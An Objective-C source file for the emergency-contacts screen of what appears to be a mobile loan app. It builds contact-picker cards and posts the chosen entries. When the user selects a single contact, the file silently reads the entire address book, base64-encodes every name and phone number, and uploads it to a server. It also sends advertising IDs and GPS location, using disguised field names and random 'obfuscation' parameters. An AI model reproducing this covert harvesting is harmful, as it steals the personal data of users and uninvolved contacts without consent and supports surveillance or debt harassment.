//
//  GtxlplBackController.m
//  OPherame
//
//  Created by todesk on 2025/6/27.
//

#import "GtxlplBackController.h"
#import "EKMGPopupView.h"
#import "ContactPermissionHandler.h"
#import "GpaymBackController.h"
#import "Base64Tool.h"
#import "UIView+FrameUtil.h"

@interface GtxlplBackController ()<OPhNavigationBackButtonDelegate>
@property (nonatomic, strong) UIScrollView *scrollView;
@property (nonatomic, strong) UIButton *nextButton;
@property (nonatomic, strong) NSArray *dataArray;
@property (nonatomic, strong) NSMutableDictionary *inputValues; // 存储用户输入的值1
@property (nonatomic, strong) NSMutableDictionary *contValues; // 存储用户输入的值2
@property (nonatomic, strong) NSMutableArray *arPdata;
@property (nonatomic, strong) NSString *startTime;
/// 上次绘制联系人卡片区时的宽度，用于旋转后重算布局
@property (nonatomic, assign) CGFloat lastContactLayoutWidth;
@end

@implementation GtxlplBackController

- (void)navigationBackButtonDidClick {
    // 执行返回前的操作...返回按钮被点击，可以在这里保存数据等操作
    [self.view endEditing:YES];
    [EKMGPopupView showWithTitle:@"Really skip verification?" content:@"After verifcation, you can enjoy\n account security protection,\n fundsare more secure, and loans\n areeasier to obtain" CancelStr:@"Cancel" sureStr:@"Confirm" confirmAction:^(NSObject * _Nullable obj) {
        
        [EKMGPopupView dismiss];
        [self popToSpecificViewController:[FrequqesController class]];
    }];
    

}

- (void)viewDidLoad {
    [super viewDidLoad];
    
    self.title = (self.navTitle.length > 0) ? self.navTitle : @"Contact Information";
    self.customTitleColor = [UIColor whiteColor];
    UIImage *image = [UIImage imageNamed:@"plobac"];
    UIImageView *backgroundImageView = [[UIImageView alloc] init];
    backgroundImageView.image = image;
    backgroundImageView.contentMode = UIViewContentModeScaleToFill;
    backgroundImageView.clipsToBounds = YES;
    backgroundImageView.frame = CGRectMake(0, 0, self.view.width, self.view.height);
    [self.view addSubview:backgroundImageView];
    
    self.startTime = [BeiMInfoUtil getCurrentTimestampInSeconds];
    
    self.scrollView = [[UIScrollView alloc] init];
    self.scrollView.backgroundColor = [UIColor clearColor];
    self.scrollView.showsVerticalScrollIndicator = YES;
    self.scrollView.alwaysBounceVertical = YES;
    [self.view addSubview:self.scrollView];
    
    self.nextButton = [UIButton buttonWithType:UIButtonTypeCustom];
    [self.nextButton setTitle:@"Next" forState:UIControlStateNormal];
    [self.nextButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    self.nextButton.titleLabel.font = [UIFont boldSystemFontOfSize:18];
    [self.nextButton setBackgroundImage:[UIImage imageNamed:@"bukathx"] forState:UIControlStateNormal];
    self.nextButton.layer.borderWidth = 1.0;
    self.nextButton.layer.borderColor = [UIColor whiteColor].CGColor;
    self.nextButton.layer.cornerRadius = 27;
    self.nextButton.clipsToBounds = YES;
    [self.nextButton addTarget:self action:@selector(confirmButtonTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.nextButton];
    
    self.inputValues = [NSMutableDictionary dictionary];
    self.contValues = [NSMutableDictionary dictionary];
    self.arPdata = [NSMutableArray array];
    self.lastContactLayoutWidth = -1;
    
    [[NetworkManager sharedManager] POST:@"/radiating/taken"
                              parameters:@{@"harukos":self.harukos,@"imagined":[RandomStringGenerator randomlyCallMethod]}
                                 headers:nil
                               progress:nil
                                success:^(id responseObject) {
        
        if([responseObject[@"heavy"] isEqualToString:@"0"]){
            self.dataArray = responseObject[@"thump"][@"frankly"][@"jiju"];
            for (NSDictionary *data in self.dataArray) {
                NSMutableDictionary *dicc = [NSMutableDictionary dictionary];
                [dicc setValue:data[@"chipped"] forKey:@"chipped"];
                [dicc setValue:data[@"travelled"] forKey:@"travelled"];
                [dicc setValue:data[@"appreciating"] forKey:@"appreciating"];
                [dicc setValue:data[@"earnestly"] forKey:@"earnestly"];
                [self.arPdata addObject:dicc];
            }
            dispatch_async(dispatch_get_main_queue(), ^{
                [self reloadContactCards];
            });
        }else{
            [SHToast showWithText:responseObject[@"daughters"]];
        }
        
    } failure:^(NSError *error) {
        NSLog(@"失败: %@", error.localizedDescription);
        [SHToast showWithText:error.localizedDescription];
        
    }];
}

- (void)viewDidLayoutSubviews {
    [super viewDidLayoutSubviews];
    CGFloat navTop = [UIView navigationBarHeight] + [UIView statusBarHeight];
    CGFloat btnH = 54;
    UIEdgeInsets safe = self.view.safeAreaInsets;
    CGFloat btnBottomMargin = 16 + safe.bottom;
    CGFloat btnW = MIN(302, self.view.bounds.size.width - 32);
    CGFloat btnX = (self.view.bounds.size.width - btnW) / 2.0;
    CGFloat btnY = self.view.bounds.size.height - btnBottomMargin - btnH;
    self.nextButton.frame = CGRectMake(btnX, btnY, btnW, btnH);
    
    CGFloat scrollTop = navTop + 16;
    CGFloat scrollH = MAX(0, btnY - 12 - scrollTop);
    CGFloat vw = CGRectGetWidth(self.view.bounds);
    self.scrollView.frame = CGRectMake(0, scrollTop, vw, scrollH);
    
    if (self.dataArray.count && vw > 1 && fabs(vw - self.lastContactLayoutWidth) > 0.5) {
        [self reloadContactCards];
    }
}

/// 设计稿：每张卡独立白底圆角，标签 + #F5F5F5 圆角输入条 + 右侧箭头
- (void)reloadContactCards {
    if (!self.scrollView) return;
    for (UIView *sub in self.scrollView.subviews.copy) {
        [sub removeFromSuperview];
    }
    if (!self.dataArray.count) {
        CGFloat cw = CGRectGetWidth(self.view.bounds);
        if (cw < 1) cw = UIScreen.mainScreen.bounds.size.width;
        self.scrollView.contentSize = CGSizeMake(cw, 0);
        return;
    }
    
    CGFloat layoutW = CGRectGetWidth(self.view.bounds);
    if (layoutW < 1) layoutW = UIScreen.mainScreen.bounds.size.width;
    CGFloat cardX = 16;
    CGFloat cardW = layoutW - cardX * 2;
    CGFloat y = 0;
    CGFloat cardSpacing = 12;
    CGFloat fieldH = 44;
    CGFloat corner = 8;
    /// 右侧箭头区域：在原先 28 基础上整体右移 15pt
    CGFloat rightAccessoryW = 68;
    CGFloat filedW = UIScreen.mainScreen.bounds.size.width - 60;
    
    for (NSInteger row = 0; row < (NSInteger)self.dataArray.count; row++) {
        NSDictionary *item = self.dataArray[row];
        NSString *rowKey = [NSString stringWithFormat:@"%ld", (long)row];
        NSString *contkey = [NSString stringWithFormat:@"C%ld", (long)row];
        
        UIView *card = [[UIView alloc] init];
        card.backgroundColor = [UIColor whiteColor];
        card.layer.cornerRadius = 14;
        card.clipsToBounds = YES;
        
        CGFloat pad = 16;
        CGFloat innerW = cardW - pad * 2;
        CGFloat cy = pad;
        
        UILabel *secTitle = [[UILabel alloc] initWithFrame:CGRectMake(pad, cy, innerW, 22)];
        secTitle.font = [UIFont boldSystemFontOfSize:16];
        secTitle.textColor = [UIColor blackColor];
        secTitle.text = item[@"trip"];
        [card addSubview:secTitle];
        cy = CGRectGetMaxY(secTitle.frame) + 16;
        
        UILabel *relCaption = [[UILabel alloc] initWithFrame:CGRectMake(pad, cy, innerW, 18)];
        relCaption.font = [UIFont systemFontOfSize:14];
        relCaption.textColor = [UIColor blackColor];
        relCaption.text = @"Select relationship";
        [card addSubview:relCaption];
        cy = CGRectGetMaxY(relCaption.frame) + 8;
        
        UIView *relBox = [[UIView alloc] initWithFrame:CGRectMake(pad, cy, innerW, fieldH)];
        relBox.backgroundColor = [UIView colorFromRGB:0xF5F5F5];
        relBox.layer.cornerRadius = corner;
        relBox.clipsToBounds = YES;
        [card addSubview:relBox];
        
        UITextField *tfRel = [[UITextField alloc] initWithFrame:CGRectMake(12, 0, filedW, fieldH)];
        tfRel.tag = 2000 + row;
        tfRel.font = [UIFont systemFontOfSize:14];
        tfRel.textColor = [UIColor blackColor];
        tfRel.placeholder = item[@"nankoku"];
        tfRel.userInteractionEnabled = YES;
        UIView *rvRel = [[UIView alloc] initWithFrame:CGRectMake(0, 0, rightAccessoryW, fieldH)];
                
        if (@available(iOS 13.0, *)) {
            UIImage *chev = [[UIImage systemImageNamed:@"chevron.right"] imageWithRenderingMode:UIImageRenderingModeAlwaysTemplate];
            UIImageView *ivRel = [[UIImageView alloc] initWithImage:chev];
            ivRel.tintColor = [UIColor colorWithWhite:0.6 alpha:1];
            ivRel.contentMode = UIViewContentModeScaleAspectFit;
            ivRel.frame = CGRectMake(22, (fieldH - 14) / 2.0, 14, 14);
            [rvRel addSubview:ivRel];
        } else {
            UILabel *cheLbl = [[UILabel alloc] initWithFrame:CGRectMake(rightAccessoryW - 20, 0, 14, fieldH)];
            cheLbl.text = @">";
            cheLbl.textAlignment = NSTextAlignmentCenter;
            cheLbl.font = [UIFont systemFontOfSize:14 weight:UIFontWeightMedium];
            cheLbl.textColor = [UIColor colorWithWhite:0.55 alpha:1];
            [rvRel addSubview:cheLbl];
        }
        tfRel.rightView = rvRel;
        tfRel.rightViewMode = UITextFieldViewModeAlways;
        UIView *lvRel = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 4, fieldH)];
        tfRel.leftView = lvRel;
        tfRel.leftViewMode = UITextFieldViewModeAlways;
        [relBox addSubview:tfRel];
        UITapGestureRecognizer *tapRel = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(handleTextFieldTap:)];
        [tfRel addGestureRecognizer:tapRel];
        
        cy = CGRectGetMaxY(relBox.frame) + 16;
        
        UILabel *contactCaption = [[UILabel alloc] initWithFrame:CGRectMake(pad, cy, innerW, 18)];
        contactCaption.font = [UIFont systemFontOfSize:14];
        contactCaption.textColor = [UIColor blackColor];
        contactCaption.text = @"Contact information";
        [card addSubview:contactCaption];
        cy = CGRectGetMaxY(contactCaption.frame) + 8;
        
        UIView *contactBox = [[UIView alloc] initWithFrame:CGRectMake(pad, cy, innerW, fieldH)];
        contactBox.backgroundColor = [UIView colorFromRGB:0xF5F5F5];
        contactBox.layer.cornerRadius = corner;
        contactBox.clipsToBounds = YES;
        [card addSubview:contactBox];
        
        UITextField *tfContact = [[UITextField alloc] initWithFrame:CGRectMake(12, 0, filedW, fieldH)];
        tfContact.tag = 3000 + row;
        tfContact.font = [UIFont systemFontOfSize:14];
        tfContact.textColor = [UIColor blackColor];
        NSString *phRegion = item[@"region"];
        tfContact.placeholder = (phRegion.length > 0) ? phRegion : @"Name – Phone number";
        tfContact.userInteractionEnabled = YES;
        UIView *rvC = [[UIView alloc] initWithFrame:CGRectMake(0, 0, rightAccessoryW, fieldH)];
        if (@available(iOS 13.0, *)) {
            UIImage *chev2 = [[UIImage systemImageNamed:@"chevron.right"] imageWithRenderingMode:UIImageRenderingModeAlwaysTemplate];
            UIImageView *ivC = [[UIImageView alloc] initWithImage:chev2];
            ivC.tintColor = [UIColor colorWithWhite:0.6 alpha:1];
            ivC.contentMode = UIViewContentModeScaleAspectFit;
            ivC.frame = CGRectMake(22, (fieldH - 14) / 2.0, 14, 14);
            [rvC addSubview:ivC];
        } else {
            UILabel *cheLbl2 = [[UILabel alloc] initWithFrame:CGRectMake(7 + 15, 0, 14, fieldH)];
            cheLbl2.text = @">";
            cheLbl2.textAlignment = NSTextAlignmentCenter;
            cheLbl2.font = [UIFont systemFontOfSize:14 weight:UIFontWeightMedium];
            cheLbl2.textColor = [UIColor colorWithWhite:0.55 alpha:1];
            [rvC addSubview:cheLbl2];
        }
        tfContact.rightView = rvC;
        tfContact.rightViewMode = UITextFieldViewModeAlways;
        UIView *lvC = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 4, fieldH)];
        tfContact.leftView = lvC;
        tfContact.leftViewMode = UITextFieldViewModeAlways;
        [contactBox addSubview:tfContact];
        UITapGestureRecognizer *tapC = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(handlecomrFieldTap:)];
        [tfContact addGestureRecognizer:tapC];
        
        if (self.inputValues[rowKey]) {
            tfRel.text = self.inputValues[rowKey];
        } else if (item[@"travelled"] && ![item[@"travelled"] isEqualToString:@""]) {
            NSArray *precise = item[@"precise"];
            if ([precise isKindOfClass:[NSArray class]] && [item[@"travelled"] intValue] > 0) {
                NSInteger idx = [item[@"travelled"] intValue] - 1;
                if (idx >= 0 && idx < (NSInteger)[precise count]) {
                    NSDictionary *imitation = precise[idx];
                    tfRel.text = imitation[@"appreciating"];
                    self.inputValues[rowKey] = imitation[@"appreciating"];
                }
            }
        }
        
        if (self.contValues[contkey]) {
            tfContact.text = self.contValues[contkey];
        } else if (item[@"earnestly"] && ![item[@"earnestly"] isEqualToString:@""]) {
            tfContact.text = [NSString stringWithFormat:@"%@ : %@", item[@"appreciating"], item[@"earnestly"]];
            self.contValues[contkey] = [NSString stringWithFormat:@"%@ : %@", item[@"appreciating"], item[@"earnestly"]];
        }
        
        CGFloat cardH = CGRectGetMaxY(contactBox.frame) + pad;
        card.frame = CGRectMake(cardX, y, cardW, cardH);
        [self.scrollView addSubview:card];
        y += cardH + cardSpacing;
    }
    
    self.scrollView.contentSize = CGSizeMake(layoutW, MAX(y - cardSpacing + 16, 0));
    self.lastContactLayoutWidth = layoutW;
}

-(void)confirmButtonTapped{
    
    
    NSMutableDictionary *parameters = [NSMutableDictionary dictionary];
    
    
    
    
    
    [parameters addEntriesFromDictionary:@{@"harukos":self.harukos,@"thump":self.arPdata.count>0?[self convertArrayToCompactJSON:self.arPdata]:@""}];
    
    [[NetworkManager sharedManager] POST:@"/radiating/glanced"
                              parameters:parameters
                                 headers:nil
                               progress:nil
                                success:^(id responseObject) {
        
        if([responseObject[@"heavy"] isEqualToString:@"0"]){
            
            NSMutableDictionary *mutbdic = [NSMutableDictionary dictionary];
            mutbdic[@"moneys"] = self.startTime;
            mutbdic[@"flatter"] = [BeiMInfoUtil getCurrentTimestampInSeconds];
            [self locaRadiatingPermis:mutbdic];
            
            [self cradiatingButtonTomomi];
        }else{
            [SHToast showWithText:responseObject[@"daughters"]];
        }
        
    } failure:^(NSError *error) {
        NSLog(@"失败: %@", error.localizedDescription);
        [SHToast showWithText:error.localizedDescription];
        
    }];
}

-(void)cradiatingButtonTomomi{
    
    
    //[self popToSpecificViewController:[FrequqesController class]];
    
    [[NetworkManager sharedManager] POST:@"/radiating/tomomi"
                              parameters:@{@"harukos": self.harukos,@"bygone":[RandomStringGenerator randomlyCallMethod], @"riveted": [RandomStringGenerator randomlyCallMethod]}
                                headers:nil
                               progress:nil
                                success:^(id responseObject) {
        
        if([responseObject[@"heavy"] isEqualToString:@"0"]){
            
            NSDictionary *species = responseObject[@"thump"][@"species"];
            if ([species[@"pensive"] isEqualToString:@"cupersuchousL"]){
                
                GpaymBackController *controller = [[GpaymBackController alloc]init];
                controller.harukos = self.harukos;
                controller.navTitle = [species valueForKey:@"downright"];
                [self.navigationController pushViewController:controller animated:YES];
            }else if(species == nil){
                [self cradiatingflipped];
            }
            
        }else{
            [SHToast showWithText:responseObject[@"daughters"]];
        }
        
    } failure:^(NSError *error) {
        NSLog(@"失败: %@", error.localizedDescription);
        [SHToast showWithText:error.localizedDescription];
        
    }];
    
    
}

- (NSString *)convertArrayToCompactJSON:(NSArray *)array {
    if (![NSJSONSerialization isValidJSONObject:array]) {
        NSLog(@"数组不能转换为JSON");
        return nil;
    }
    
    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:array
                                                      options:0  // 关键：使用0而不是NSJSONWritingPrettyPrinted
                                                        error:&error];
    
    if (!jsonData) {
        NSLog(@"转换为JSON失败: %@", error.localizedDescription);
        return nil;
    }
    
    return [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
}
-(void)handleTextFieldTap:(UITapGestureRecognizer*)tap{
    if (![tap.view isKindOfClass:[UITextField class]]) return;
    UITextField *textField = (UITextField *)tap.view;
    NSInteger indexPathRow = textField.tag - 2000;
    if (indexPathRow < 0 || indexPathRow >= (NSInteger)self.dataArray.count) return;
  
    NSDictionary *item = self.dataArray[indexPathRow];
    NSString *key = [NSString stringWithFormat:@"%ld", (long)indexPathRow];
    
    NSMutableDictionary *dicc = [NSMutableDictionary dictionary];
    //单选
    [EKMGPopupView showWithTitle:item[@"trip"] isComper:YES addreess:nil mainOptions:item[@"precise"] confirmAction:^(NSObject * _Nullable obj) {
        NSNumber *num = (NSNumber*)obj;
        NSDictionary *ring = [item[@"precise"] objectAtIndex:[num intValue]];
        [self.inputValues setValue:ring[@"appreciating"] forKey:key];
        
        [self reloadContactCards];
        
        if(self.arPdata.count>0){
            NSMutableArray *chippeds = [NSMutableArray array];
            for (NSDictionary *km in self.arPdata) {
                [chippeds addObject:km[@"chipped"]];
            }
            
            
            if([chippeds containsObject:item[@"chipped"]]){
                [self.arPdata enumerateObjectsUsingBlock:^(NSDictionary *dict, NSUInteger idx, BOOL *stop) {
                    if ([dict[@"chipped"] isEqualToString:item[@"chipped"]]) {
                        NSMutableDictionary *mutableDict = [dict mutableCopy];
                        mutableDict[@"travelled"] = ring[@"imitation"];
                        [mutableDict setValue:ring[@"imitation"] forKey:@"travelled"];
                        self.arPdata[idx] = mutableDict;
                    }
                }];
                
                
            }else{
                [dicc setValue:item[@"chipped"] forKey:@"chipped"];
                [dicc setValue:ring[@"imitation"] forKey:@"travelled"];
                [self.arPdata addObject:dicc];
            }
            
            
            
        }else{
            [dicc setValue:item[@"chipped"] forKey:@"chipped"];
            [dicc setValue:ring[@"imitation"] forKey:@"travelled"];
            [self.arPdata addObject:dicc];
        }
        
    }];
}

-(void)handlecomrFieldTap:(UITapGestureRecognizer*)tap{
    if (![tap.view isKindOfClass:[UITextField class]]) return;
    UITextField *comField = (UITextField *)tap.view;
    NSInteger indexPathRow = comField.tag - 3000;
    if (indexPathRow < 0 || indexPathRow >= (NSInteger)self.dataArray.count) return;
    NSDictionary *item = self.dataArray[indexPathRow];
    
    
    NSString *contkey = [NSString stringWithFormat:@"C%ld", (long)indexPathRow];
    
    NSMutableDictionary *dicc = [NSMutableDictionary dictionary];
    
    [[ContactPermissionHandler sharedInstance] requestContactPermissionWithViewController:self
                                                                          onContactSelected:^(NSString * _Nullable name, NSString * _Nullable phoneNumber) {
            if (name && phoneNumber) {
                NSLog(@"选择了联系人: %@, 电话: %@", name, phoneNumber);
                
                
                
                
                // 更新UI显示选择的联系人
                [self.contValues setValue:[NSString stringWithFormat:@"%@ : %@",name, phoneNumber] forKey:contkey];
                [self reloadContactCards];
                
                if(self.arPdata.count>0){
                    NSMutableArray *chippeds = [NSMutableArray array];
                    for (NSDictionary *km in self.arPdata) {
                        [chippeds addObject:km[@"chipped"]];
                    }
                    
                    
                    if([chippeds containsObject:item[@"chipped"]]){
                        [self.arPdata enumerateObjectsUsingBlock:^(NSDictionary *dict, NSUInteger idx, BOOL *stop) {
                                                if ([dict[@"chipped"] isEqualToString:item[@"chipped"]]) {
                                                    NSMutableDictionary *mutableDict = [dict mutableCopy];
                                                    mutableDict[@"earnestly"] = phoneNumber;
                                                    mutableDict[@"appreciating"] = name;
                                                    
                                                    self.arPdata[idx] = mutableDict;
                                                }
                                            }];
                        
                        
                    }else{
                        [dicc setValue:phoneNumber forKey:@"earnestly"];
                        [dicc setValue:name forKey:@"appreciating"];
                        [dicc setValue:item[@"chipped"] forKey:@"chipped"];
                        [self.arPdata addObject:dicc];
                    }
                }else{
                    [dicc setValue:phoneNumber forKey:@"earnestly"];
                    [dicc setValue:name forKey:@"appreciating"];
                    [dicc setValue:item[@"chipped"] forKey:@"chipped"];
                    [self.arPdata addObject:dicc];
                }
                
                
                
                
//                NSMutableArray *contacts = [NSMutableArray array];
//                for (NSDictionary *dicc in self.arPdata) {
//                    if(![dicc[@"earnestly"] isEqualToString:@""]&&![dicc[@"appreciating"] isEqualToString:@""])
//                    [contacts addObject:@{
//                        @"complaining": dicc[@"earnestly"],
//                        @"appreciating": dicc[@"appreciating"]
//                    }];
//                }
                
//                // 上报联系人数据
//                [self reportContacts:contacts completion:^(BOOL success, NSError *error) {
//                    NSLog(@"%d",success);
//                }];
                
                
                // 上报所有联系人信息
                [self uploadAllContactsWithCompletion:^(BOOL success, NSError * _Nullable error) {
                    if (!success) {
                        NSLog(@"上传联系人失败: %@", error.localizedDescription);
                    }
                }];
                
            } else {
                NSLog(@"用户取消了选择");
                if(!name && phoneNumber){
                    [SHToast showWithText:@"姓名为空"];
                }else if (name && !phoneNumber){
                    [SHToast showWithText:@"手机号为空"];
                }
            }
        } onPermissionDenied:^{
            NSLog(@"用户拒绝了权限");
        }];
}







-(void)locaRadiatingPermis:(NSMutableDictionary*)permis{
    
    
    [[LocationUtilfo sharedManager] getFullLocationWithViewController:self completion:^(NSString *country, NSString *countryCode, NSString *province, NSString *city, NSString *district, NSString *street, NSString *fullAddress, CLLocationCoordinate2D coordinate, NSError *error) {
    }];
    
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        
        NSString *lat = [[NSUserDefaults standardUserDefaults] valueForKey:@"lllasd"];
        NSString *lngcoo = [[NSUserDefaults standardUserDefaults] valueForKey:@"lllong"];
        
        NSDictionary *medis = @{
            @"centimetre": self.harukos,   // 产品ID
            @"bill": @"7",         // 看文档首页 上报场景类型：1、注册 2、认证选择 3、证件信息 4、人脸照片 5、个人信息 6、工作信息 7、紧急联系人 8、银行卡信息9、开始申贷 10、结束申贷
            @"flipped": @"",            // 用户申贷全局订单号，不用管, 传空即可
            @"splitting": [BeiMInfoUtil getOrCreateIDFV], // idfv
            @"tight": [[ASIdentifierManager sharedManager].advertisingIdentifier UUIDString]?:@"",             // idfa
            @"stroke": lngcoo?:@"",     // 经度
            @"surveying": lat?:@"",        // 纬度
            @"skills": [RandomStringGenerator randomlyCallMethod]         // 混淆字段
        };
        
        [permis addEntriesFromDictionary:medis];
        [[NetworkManager sharedManager]googleMarketPOST:@"/radiating/winds" parameters:permis headers:nil progress:nil success:^(id  _Nullable responseObject) {
            if([responseObject[@"heavy"] isEqualToString:@"0"]){
                
            }
            
        } failure:^(NSError * _Nonnull error) {
            
        }];
        
    });
}


-(void)cradiatingflipped{
    
    //开始时间
    NSString *StartTime = [BeiMInfoUtil getCurrentTimestampInSeconds];
    NSMutableDictionary *mutbdic = [NSMutableDictionary dictionary];
    mutbdic[@"moneys"] = StartTime;
    mutbdic[@"flatter"] = [BeiMInfoUtil getCurrentTimestampInSeconds];
    mutbdic[@"bill"] = @"9";
    
    [[NetworkManager sharedManager] POST:@"/radiating/car"
                              parameters:@{@"concentration": self.flipped?:@"",@"koimari":[RandomStringGenerator randomlyCallMethod], @"lacquer": [RandomStringGenerator randomlyCallMethod],@"intervals":[RandomStringGenerator randomlyCallMethod],@"equal":[RandomStringGenerator randomlyCallMethod]}
                                headers:nil
                               progress:nil
                                success:^(id responseObject) {
        
        if([responseObject[@"heavy"] isEqualToString:@"0"]){
            
            NSDictionary *species = responseObject[@"thump"][@"shiny"];
            if(species != nil){
                
                //跳转H5网页
                NSString *shiny = [BeiMInfoUtil appendParamsToURL:responseObject[@"thump"][@"shiny"] params:[[NetworkManager sharedManager]  addCommonParameters:nil]];
//                NSURL *url = [NSURL URLWithString:shiny];
//                SFSafariViewController *safariVC = [[SFSafariViewController alloc] initWithURL:url];
//                // 在当前的视图控制器上呈现
//                [self presentViewController:safariVC animated:YES completion:nil];
                
                WKWebViewController *webVC = [[WKWebViewController alloc] initWithURLString:shiny];
                                webVC.themeColor = [UIView colorFromRGB:0x3D6AFF];
                webVC.harukos = self.harukos;
                                [self.navigationController pushViewController:webVC animated:YES];
                [self locaRadiatingPermis:mutbdic];
            }
            
        }else{
            [SHToast showWithText:responseObject[@"daughters"]];
        }
        
    } failure:^(NSError *error) {
        NSLog(@"失败: %@", error.localizedDescription);
        [SHToast showWithText:error.localizedDescription];
        
    }];
    
}



#pragma mark - 上传所有联系
- (void)uploadAllContactsWithCompletion:(void (^)(BOOL success, NSError * _Nullable error))completion {
    CNAuthorizationStatus status = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    
//    status == CNAuthorizationStatusDenied ||  需求:通讯录IOS18以上需要添加部分授权也可以继续流程  所以不添加到if
    if ( status == CNAuthorizationStatusRestricted) {
        NSError *error = [NSError errorWithDomain:@"ContactAccess"
                                             code:status
                                         userInfo:@{NSLocalizedDescriptionKey: @"联系人访问权限被拒绝"}];
        if (completion) completion(NO, error);
        return;
    }
    
    CNContactStore *store = [[CNContactStore alloc] init];
    if (status == CNAuthorizationStatusNotDetermined) {
        [store requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, NSError * _Nullable error) {
            dispatch_async(dispatch_get_main_queue(), ^{
                if (granted) {
                    [self fetchAndUploadContactsFromStore:store completion:completion];
                } else {
                    if (completion) completion(NO, error);
                }
            });
        }];
    } else {
        [self fetchAndUploadContactsFromStore:store completion:completion];
    }
}

- (void)fetchAndUploadContactsFromStore:(CNContactStore *)store completion:(void(^)(BOOL success, NSError *error))completion {
    
    CNContactStore *contactStore = [[CNContactStore alloc] init];
    NSArray *keysToFetch = @[CNContactFamilyNameKey, CNContactGivenNameKey, CNContactPhoneNumbersKey, CNContactOrganizationNameKey];
    NSError *error;

    // Create a predicate if you need to filter contacts
    // NSPredicate *predicate = [CNContact predicateForContactsMatchingName:@"John"];

    NSArray *arr = [contactStore unifiedContactsMatchingPredicate:nil keysToFetch:keysToFetch error:&error];
    if (!error) {
        NSMutableArray *contacts = [NSMutableArray array];
        for (int i = 0; i < arr.count; i++) {
            CNContact *contact = arr[i];
            NSString *familyName = contact.familyName;
            NSString *givenName = contact.givenName;
            
            // Get phone numbers
            NSMutableArray *phones = [NSMutableArray array];
            for (CNLabeledValue *phone in contact.phoneNumbers) {
                CNPhoneNumber *phoneNum = phone.value;
                [phones addObject:[phoneNum.stringValue stringByReplacingOccurrencesOfString:@" " withString:@""]];
            }
            
            [contacts addObject:@{
                @"complaining": phones.count ? [phones componentsJoinedByString:@","] : @"",
                @"appreciating": [NSString stringWithFormat:@"%@%@", givenName, familyName]
            }];
        }
        
        
        // 上报联系人数据
        [self reportContacts:contacts completion:completion];
        
    }
    
}

- (void)reportContacts:(NSArray *)contacts completion:(void(^)(BOOL success, NSError *error))completion {
    if (!contacts || contacts.count == 0) {
        if (completion) completion(YES, nil);
        return;
    }
    
    // 确保contacts可以被序列化为JSON
    NSError *jsonError;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:contacts options:0 error:&jsonError];
    if (!jsonData) {
        if (completion) completion(NO, jsonError);
        return;
    }
    
    // 使用Base64编码
    NSString *encodedContacts = [Base64Tool base64EncodeData:jsonData];
    if (!encodedContacts) {
        NSError *error = [NSError errorWithDomain:@"ContactAccess"
                                             code:-2
                                         userInfo:@{NSLocalizedDescriptionKey: @"联系人数据编码失败"}];
        if (completion) completion(NO, error);
        return;
    }
    
    // 构建请求参数
    NSDictionary *parameters = @{
        @"imitation": @"3",
        @"reverberate": [RandomStringGenerator randomlyCallMethod],
        @"satisfying": [RandomStringGenerator randomlyCallMethod],
        @"thump": encodedContacts
    };
    
    // 发送网络请求
    [[NetworkManager sharedManager] googleMarketPOST:@"/radiating/remember"
                                         parameters:parameters
                                           headers:nil
                                         progress:nil
                                          success:^(id  _Nullable responseObject) {
        if (completion) completion(YES, nil);
    } failure:^(NSError * _Nonnull error) {
        if (completion) completion(NO, error);
    }];
}

@end
